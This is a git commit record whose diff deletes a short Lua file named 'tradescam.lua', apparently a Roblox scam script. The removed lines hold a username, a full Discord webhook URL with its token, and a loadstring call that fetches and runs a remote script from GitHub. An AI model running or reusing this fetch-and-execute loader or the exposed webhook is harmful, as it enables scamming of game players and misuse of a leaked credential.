f44672a112e684ad9b776b05aa914f4606d33fff
JaysonAV <114709161+JaysonAV@users.noreply.github.com>
2022-11-29 19:12:50 -0800

    Delete tradescam.lua

--- tradescam.lua
+++
@@ -1,4 +0,0 @@
-UserName = "HalfOfJay"
-WebHook = "https://discord.com/api/webhooks/1047340872557137970/k0RYnBXc9124kkNs6FdVDleWrK5VQB8dcQ2zUK01dk0GcXTd2BIsAtrLolh-8Rk8Dp5b"
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
